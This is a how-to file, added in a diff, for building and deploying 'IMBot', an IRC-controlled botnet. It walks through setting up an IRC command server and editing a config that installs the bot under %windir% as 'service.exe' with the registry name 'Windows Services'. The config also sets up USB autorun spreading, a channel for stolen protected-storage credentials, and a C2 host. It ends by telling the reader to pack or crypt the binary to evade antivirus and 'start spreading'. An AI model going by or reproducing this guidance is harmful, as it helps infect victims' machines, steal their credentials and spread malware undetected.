@@ -1,0 +1,65 @@
+***********************
+***********************
+**                   **
+**   IMBot How-To    **
+**                   **
+***********************
+***********************
+
+1) Firstly you are gonna need an irc server, This bot works best on a modded irc server, i have included
+   a server link in IRCD_Instructions.txt. This server is the one i have done all the testing on and works best!
+   If you use another irc server your bots may connect and then disconnect instantly, if this happens you will have
+   to uninstall the server and try again. Full instructions on how to set it up will be found in IRCD_Instructions.txt.
+
+2) Set up your compiler and runtime environment. You can find out how to do this by reading "Compile_Instructions.txt".
+
+3) This bot has an optional torrent seeder, if you wish to use this then you will need to upload your already seeded
+   torrent to a host that you will then add in "/tools/torrent/uTorrent/torrent_config.h" and "/tools/torrent/Azerus/config.h". 
+   If you want to add this then you will need to compile this first, then open /lib/res.rc with notepad and take away the 
+   2 "//" symbols on the second line. If you dont want to use this just move to the next step!
+
+4) Now you will need to configure your bot. open config.h with either msdev c++ or notepad and edit the config to
+   what suits you best. Your config should look something like this:
+
+/* START CONFIG.h */
+
+char xetumhandle[]		= "aS3V6Nu";
+char bid[]			= "IMBot";
+char prefix			= '.';
+char gotopth[]			= "%windir%";
+char exename[]			= "service.exe";
+char password[]			= "test";
+char authhost1[]		= "*!*@*";
+char *authost[] 		= { authhost1 };
+char szRegname[]	    	= "Windows Services";
+char USB_STR_FILENAME[]		= "autorunme.exe";
+char USB_CHANNEL[]		= "#test";	// USB Chan
+char pstore_chan[]		= "#test";	// PSTORE Chan
+
+SERVER sinfo[]={
+		{
+		"irc.h1t3m.org","serverpass",6667,"#mainchan","","-ix","-ix","#msnchan",
+		},
+	};
+
+/* END CONFIG.H */
+
+   After you have edited config.h save it and then goto the file "/cpp/usb.cpp" and edit this line to the
+   channel you want usb spread messages redirected too:
+
+/* START UDB.CPP */
+
+   #define USB_CHANNEL		"#usb#"
+
+/* END USB.CPP   */
+
+5) Now that your config is done you can either move to step 5 and compile, or change some of your bots
+   commands in cmd.h. If you wish to edit just change the values inside the "".
+
+6) To compile double click on "xBuild.cmd" and cmd should open and start compiling. If it says an error, or cmd
+   dosen't compile it, open imbot.dsw with msdev and click the "File View" tab, then right click "imbot files" 
+   and select "Build" to start compiling.
+
+7) If you compiled with xBuild.cmd you will have a new folder called "exe" with imbot.exe inside. If you compiled
+   via imbot.dsw then you will have a folder called "Bin" with imbot.exe inside. This imbot.exe file is your un-packed
+   bot. Use your favourite packer or crypter to make un detectable to Av's and start spreading.
